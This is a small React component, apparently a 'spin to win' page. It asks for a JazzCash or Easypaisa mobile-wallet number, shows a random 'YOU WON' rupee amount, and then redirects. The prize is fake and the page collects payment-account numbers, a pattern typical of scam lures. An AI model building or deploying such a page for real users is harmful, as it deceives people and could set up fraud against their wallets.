import React, { useState } from 'react';
import { useNavigate } from "react-router-dom";

const Page = () => {
  
  const navigate = useNavigate();

  const [phnumber, setfName] = useState(''); // Phone number state
  const [randumnum, setNumber] = useState(''); // Random number state
  const handleChange = (e) => {
    setfName(e.target.value);
  };
  const submit = () => {
    console.log(phnumber);
    let genrate = Math.random() * 600;
    genrate = Math.round(genrate);

    setNumber(
      <>
        YOU WON <br /> {genrate} RS
      </>
    );

    setTimeout(() => {
      navigate('/end'); 
    }, 1800);
  };
  return (
    <div className='flex justify-center items-center flex-col h-[98vh] gap-2'>
      <input
        className='outline-blue-600 border-2 p-2 w-64 '
        placeholder="Enter Jazz cash or Easypaisa number"
        onChange={handleChange}
      />
      
      <div className='h-[13vh] my-1 text-center font-semibold text-blue-500'>{randumnum}</div>
      
      {phnumber && (
        <button onClick={submit} className='bg-blue-600 w-64 p-2 rounded-lg text-white'>
          SPIN
        </button>
      )}
    </div>
  );
};

export default Page;
